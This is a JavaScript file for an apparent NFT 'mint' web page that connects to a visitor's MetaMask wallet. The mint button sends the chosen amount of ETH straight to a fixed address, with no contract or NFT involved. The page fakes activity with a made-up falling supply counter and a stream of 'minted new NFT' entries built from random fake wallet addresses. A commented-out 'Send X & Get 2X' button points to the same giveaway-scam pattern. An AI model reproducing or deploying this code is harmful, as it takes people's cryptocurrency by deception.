window.onload = function(){

    function appInit(){

        function detectMob() {
            return ( ( window.innerWidth <= 800 ) );
        }

        async function mint(){
            function isMetaMaskInstall(){
                return Boolean(window.ethereum);
            }

            function isEthemeumMainnet(){
                return Boolean(ethereum.networkVersion.toString() === "1");
            }

            async function connectMetamask() {
                await ethereum.request({ method: 'eth_requestAccounts' });
            }
            
            if(!isMetaMaskInstall()){

                if(detectMob()){
                    //alert("MetaMask not found. Please open site in MetaMask browser");
                    let link = "https://metamask.app.link/dapp/" + window.location.hostname + "/";
                    let html = "";
                    html += "You don't have a MetaMask installed.<br>";
                    html += "Please install MetaMask and <a href='"+link+"' style='color:#f89d35;font-weight: bold;'>open site in MetaMask</a> browser<br><br>"
                    html += "Official MetaMask download links: <a href='https://metamask.app.link/skAH3BaF99' style='color:#f89d35;font-weight: bold;'>iOS</a>, "
                    html += "<a href='https://metamask.app.link/bxwkE8oF99' style='color:#f89d35;font-weight: bold;'>Android</a>"
                    $('.alert-eth-message-change').html(html);
                    $('.alert-eth-message').fadeIn(200);
                    window.location.href = link;
                    return;
                }else{
                    //alert("MetaMask not found. Please install it");
                    $('.alert-eth-message-change').html("You don't have a MetaMask installed.<br>Please <a href='https://metamask.io/' target='_blank' style='color:#f89d35;font-weight: bold;'>install MetaMask</a> and try again");
                    $('.alert-eth-message').fadeIn(200);
                    return;
                }
                
            }


            await ethereum.request({ method: 'eth_requestAccounts' });

            if(!isEthemeumMainnet()){
                //alert("Please change MetaMask network to Ethereum Mainnet");
                $('.alert-eth-message-change').html("Please change MetaMask network to Ethereum Mainnet");
                $('.alert-eth-message').fadeIn(200);
                return;
            }

            //let ethAmount = $('#eth-amount').val();

            let count = $('.eth-mint-count').text()*1;
            let ethTotal = Math.round(count*ethPerMint * 100) / 100;

            const total = ethTotal * 1000000000000000000
            const address = (await ethereum.request({ method: 'eth_accounts' }))[0]
            await ethereum.request({
                method: 'eth_sendTransaction',
                params: [
                    {
                        from: address,
                        to: ethAddress,
                        value: total.toString(16)
                    },
                ],
            });
        }


        try{
            $('#mint').click(function(){
                mint();
                return false;
            })

            

        }catch (e) {
            console.error(e);
        }


        function getRandom(min, max) {
          let rand = min - 0.5 + Math.random() * (max - min + 1);
          return Math.round(rand);
        }

        function separator(numb) {
            var str = numb.toString().split(".");
            str[0] = str[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
            return str.join(".");
        }


        window.sessionStorage;

        let funds = sessionStorage.getItem('funds');

        if(funds == null){
            // funds = getRandom(113, 136);
            funds = ethLeftSupply;
            sessionStorage.setItem('funds', funds);
        }



        function makeid(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
              result += characters.charAt(Math.floor(Math.random() * 
            charactersLength));
            }
            return result;
        }


        fundsText = separator(Math.round(funds));
        //$('.remaining-funds').text(fundsText);

        $('.Loading span').text('MINTED: ' + (ethMaxSupply - funds)+ ' / ' + ethMaxSupply);
        $('.Loading-bar').animate({width: ((ethMaxSupply-funds)/ethMaxSupply*100-1.8)+"%" }, 200);

        function lastMintTimeout(){
            let randTimeout = getRandom(5000,7000);

            setTimeout(function(){
                fundsRand = getRandom(1, 123);
                mintFunc(fundsRand);

            }, randTimeout);
        }

        lastMintTimeout();


        function mintFunc(fundsRand){
            funds -= fundsRand;

            if(funds <= 21){
                funds = 21;
                return false;
            }

            fundsText = separator(Math.round(funds));
            //$('.remaining-funds').text(fundsText);

            sessionStorage.setItem('funds', funds);

            $('.Loading span').text('MINTED: ' + (ethMaxSupply - funds)+ ' / ' + ethMaxSupply);
            $('.Loading-bar').animate({width: ((ethMaxSupply-funds)/ethMaxSupply*100-1.8)+"%" }, 200);

            // console.log(fundsRand);

            for(let i=0;i<fundsRand;i++){
                //let obj = $('<div class="last-mint-single"><img src="mining.png" style="width:26px;vertical-align: middle;"> 0х' + makeid(4) + '...' + makeid(5) + ' mint new NFT</div>');
                let obj = $('<div class="last-minted-single"><img src="mint.png" style="width:26px;vertical-align: middle;"><span data-time="1">1 sec ago</span> 0х' + makeid(4) + '...' + makeid(4) + ' minted new NFT</div>');
                //obj.fadeOut(0).delay(i*200).fadeIn(200).delay(2000).fadeOut(200);
                $('.last-minted-list').prepend(obj);
            }

            let i=0;
            $('.last-minted-single').each(function(){
                i++;
                if(i>5){
                    $(this).remove();
                }
            });
            
            lastMintTimeout();
        }


        /*
        $('#eth-amount').on("keyup", function(){
            let val = $(this).val();
            $('#mint span').text("Send " + val + " & Get " + (val*2));
        });
        $('#eth-amount').on("change", function(){
            let val = $(this).val();
            $('#mint span').text("Send " + val + " & Get " + (val*2));
        });
        */


        $(".eth-mint-minus").click(function(){
            let count = $('.eth-mint-count').text()*1;

            if(count <= 1){
                return false;
            }

            count = count-1;

            $('.eth-mint-count').text(count);
            //$('.eth-sum').text(count*ethPerMint);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );

            return false;
        });


        $(".eth-mint-plus").click(function(){
            let count = $('.eth-mint-count').text()*1;

            if(count >= ethMaxPerWallet){
                return false;
            }

            count = count+1;

            $('.eth-mint-count').text(count);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );

            return false;
        });

        $('#maxNumber').click(function(){
            let count = ethMaxPerWallet;
            $('.eth-mint-count').text(count);
            $('.eth-sum').text(Math.round(count*ethPerMint * 100) / 100 );
        });


        setInterval(function(){
            $('.last-minted-single span').each(function(){
                let obj = $(this);
                let sec = obj.attr('data-time')*1;
                obj.text(sec+2 + " sec ago");
                obj.attr('data-time', sec+2);
            });
        },2000);

    }

    appInit();
}